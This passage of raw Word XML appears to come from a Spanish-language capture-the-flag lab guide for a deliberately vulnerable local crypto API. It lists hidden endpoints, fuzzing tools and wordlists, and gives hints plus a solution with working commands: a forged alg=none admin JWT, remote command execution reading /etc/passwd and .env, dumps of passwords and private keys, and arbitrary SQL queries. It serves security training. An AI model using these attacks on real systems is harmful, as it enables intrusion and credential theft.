          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>/api/v2/auth/login.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Cambio de version en URL</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Sin rate limit, expone query SQL</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>/api/v3/auth/login.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Idem</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t xml:space="preserve">Acepta </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>alg=none</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> directamente</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>/api/v3/admin/exec.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Wordlist + verb fuzz POST</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>RCE sin auth</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>/api/test/users.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t xml:space="preserve">Wordlist </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>api-endpoints</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Dump completo (users + wallets + private_keys)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>/api/dev/dump.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Idem</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Query SQL arbitraria</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>/api/staging/auth/login.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Idem</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Login a misma DB sin rate limit</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>/api/internal/rates.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Idem (ya existia en LAB09)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Manipulacion de precios</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Herramientas Recomendadas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C3E50"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
              </w:rPr>
              <w:t>Herramienta</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
            <w:shd w:val="clear" w:color="auto" w:fill="2C3E50"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
              </w:rPr>
              <w:t>Uso</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>kiterunner kr scan</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Brute de endpoints API con wordlists curadas</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>ffuf -mc 200,401,403</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Fuzzing rapido por status codes</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>arjun --get</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Detectar parametros validos</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Postman</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t xml:space="preserve">Importar </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>postman_collection.json</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> y replay</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>swagger-ui</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> local</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t xml:space="preserve">Visualizar </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>swagger.json</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> y </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>openapi.json</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>curl + jq</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Comparar respuestas v1 vs v2 vs v3</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Wordlists Recomendados</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>SecLists/Discovery/Web-Content/api/api-endpoints.txt</w:t>
        <w:br/>
        <w:t>SecLists/Discovery/Web-Content/api/objects.txt</w:t>
        <w:br/>
        <w:t>SecLists/Discovery/Web-Content/api/actions.txt</w:t>
        <w:br/>
        <w:t>SecLists/Discovery/Web-Content/quickhits.txt</w:t>
        <w:br/>
        <w:t>assetnote/wordlists/data/automated/swagger.txt</w:t>
        <w:br/>
        <w:t>wordlists/cryptovulnx-api-versions.txt   (incluido)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>wordlists/cryptovulnx-api-versions.txt</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>v1</w:t>
        <w:br/>
        <w:t>v2</w:t>
        <w:br/>
        <w:t>v3</w:t>
        <w:br/>
        <w:t>v4</w:t>
        <w:br/>
        <w:t>beta</w:t>
        <w:br/>
        <w:t>internal</w:t>
        <w:br/>
        <w:t>test</w:t>
        <w:br/>
        <w:t>testing</w:t>
        <w:br/>
        <w:t>dev</w:t>
        <w:br/>
        <w:t>develop</w:t>
        <w:br/>
        <w:t>development</w:t>
        <w:br/>
        <w:t>staging</w:t>
        <w:br/>
        <w:t>sandbox</w:t>
        <w:br/>
        <w:t>qa</w:t>
        <w:br/>
        <w:t>preview</w:t>
        <w:br/>
        <w:t>canary</w:t>
        <w:br/>
        <w:t>nightly</w:t>
        <w:br/>
        <w:t>legacy</w:t>
        <w:br/>
        <w:t>old</w:t>
        <w:br/>
        <w:t>deprecated</w:t>
        <w:br/>
        <w:t>private</w:t>
        <w:br/>
        <w:t>admin</w:t>
        <w:br/>
        <w:t>gateway</w:t>
        <w:br/>
        <w:t>public</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Dificultad</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Media</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> - hay que identificar que </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>swagger.json</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> no es la fuente de verdad y buscar la version interna.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Pistas</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i/>
          <w:color w:val="446688"/>
        </w:rPr>
        <w:t>Pista 1 - Buscar swagger</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>TARGET=http://localhost:8080</w:t>
        <w:br/>
        <w:br/>
        <w:t># Spec publico</w:t>
        <w:br/>
        <w:t>curl -s $TARGET/api/swagger.json | jq</w:t>
        <w:br/>
        <w:br/>
        <w:t># Pista: el campo x-internal-servers lista versiones ocultas</w:t>
        <w:br/>
        <w:t>curl -s $TARGET/api/swagger.json | jq '."x-internal-servers"'</w:t>
        <w:br/>
        <w:br/>
        <w:t># Hay un spec interno?</w:t>
        <w:br/>
        <w:t>curl -s $TARGET/api/v1/openapi.json | jq | head -50</w:t>
        <w:br/>
        <w:t>curl -s $TARGET/api/v1/openapi.json | jq '."x-undocumented-endpoints" // .paths | keys'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i/>
          <w:color w:val="446688"/>
        </w:rPr>
        <w:t>Pista 2 - Fuzzing de versiones</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Brute de versiones de API</w:t>
        <w:br/>
        <w:t>ffuf -w wordlists/cryptovulnx-api-versions.txt \</w:t>
        <w:br/>
        <w:t xml:space="preserve">     -u $TARGET/api/FUZZ/auth/login.php \</w:t>
        <w:br/>
        <w:t xml:space="preserve">     -mc 200,401,405 -t 30</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Hits esperados: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>v1</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>v2</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>v3</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>staging</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Test/dev/internal no tienen </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>auth/login.php</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> pero si otros endpoints (probar fuzzing directo de paths).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i/>
          <w:color w:val="446688"/>
        </w:rPr>
        <w:t>Pista 3 - Comparar respuestas</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>for V in v1 v2 v3 staging; do</w:t>
        <w:br/>
        <w:t xml:space="preserve">    echo "=== /api/$V/auth/login.php ==="</w:t>
        <w:br/>
        <w:t xml:space="preserve">    curl -s -X POST $TARGET/api/$V/auth/login.php \</w:t>
        <w:br/>
        <w:t xml:space="preserve">        -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">        -d '{"username":"x","password":"y"}'</w:t>
        <w:br/>
        <w:t xml:space="preserve">    echo</w:t>
        <w:br/>
        <w:t>done</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">v3 te invita a probar con </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Authorization: Bearer &lt;jwt-alg-none&gt;</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i/>
          <w:color w:val="446688"/>
        </w:rPr>
        <w:t>Pista 4 - alg=none en v3</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Forjar JWT con alg=none que diga role=admin</w:t>
        <w:br/>
        <w:t>HEADER=$(echo -n '{"typ":"JWT","alg":"none"}' | base64 | tr -d '=' | tr '+/' '-_')</w:t>
        <w:br/>
        <w:t>PAYLOAD=$(echo -n '{"user_id":1,"username":"admin","role":"admin"}' | base64 | tr -d '=' | tr '+/' '-_')</w:t>
        <w:br/>
        <w:t>TOKEN="${HEADER}.${PAYLOAD}."</w:t>
        <w:br/>
        <w:br/>
        <w:t>curl -s $TARGET/api/v3/auth/login.php \</w:t>
        <w:br/>
        <w:t xml:space="preserve">     -H "Authorization: Bearer $TOKEN"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i/>
          <w:color w:val="446688"/>
        </w:rPr>
        <w:t>Pista 5 - RCE en /api/v3/admin/exec.php</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl -s "$TARGET/api/v3/admin/exec.php?cmd=id"</w:t>
        <w:br/>
        <w:t>curl -s "$TARGET/api/v3/admin/exec.php?cmd=cat+/var/www/html/.env"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i/>
          <w:color w:val="446688"/>
        </w:rPr>
        <w:t>Pista 6 - Postman collection</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl -s $TARGET/postman_collection.json | jq '.variable, .auth'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Te llevas: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>adminToken=admin_dev_bypass_v1</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>internalToken=internal_svc_token_2024_q1</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>jwtSecret=crypto123</w:t>
      </w:r>
      <w:r>
        <w:t>, y un JWT firmado con esos datos.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Solucion Resumida</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>TARGET=http://localhost:8080</w:t>
        <w:br/>
        <w:br/>
        <w:t># 1. Sacar swagger publico y mirar x-internal-servers</w:t>
        <w:br/>
        <w:t>curl -s $TARGET/api/swagger.json | jq '."x-internal-servers"'</w:t>
        <w:br/>
        <w:br/>
        <w:t># 2. Sacar openapi interno</w:t>
        <w:br/>
        <w:t>curl -s $TARGET/api/v1/openapi.json | jq '.paths | keys'</w:t>
        <w:br/>
        <w:br/>
        <w:t># 3. Postman collection</w:t>
        <w:br/>
        <w:t>curl -s $TARGET/postman_collection.json | jq '.variable[] | {key, value}'</w:t>
        <w:br/>
        <w:br/>
        <w:t># 4. Forjar JWT alg=none</w:t>
        <w:br/>
        <w:t>H=$(printf '{"typ":"JWT","alg":"none"}' | base64 | tr -d '=' | tr '+/' '-_')</w:t>
        <w:br/>
        <w:t>P=$(printf '{"user_id":1,"role":"admin"}' | base64 | tr -d '=' | tr '+/' '-_')</w:t>
        <w:br/>
        <w:t>curl -s "$TARGET/api/v3/auth/login.php" -H "Authorization: Bearer $H.$P."</w:t>
        <w:br/>
        <w:br/>
        <w:t># 5. RCE en v3</w:t>
        <w:br/>
        <w:t>curl -s "$TARGET/api/v3/admin/exec.php?cmd=cat+/etc/passwd"</w:t>
        <w:br/>
        <w:br/>
        <w:t># 6. Dump completo via /api/test/</w:t>
        <w:br/>
        <w:t>curl -s "$TARGET/api/test/users.php" | jq '.users[] | {username, password_plain, role}'</w:t>
        <w:br/>
        <w:br/>
        <w:t># 7. Query arbitraria via /api/dev/</w:t>
        <w:br/>
        <w:t>curl -s "$TARGET/api/dev/dump.php?q=SELECT+*+FROM+internal_config"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Flags</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>FLAG-INVENT-01  -&gt; swagger.json/x-internal-servers</w:t>
        <w:br/>
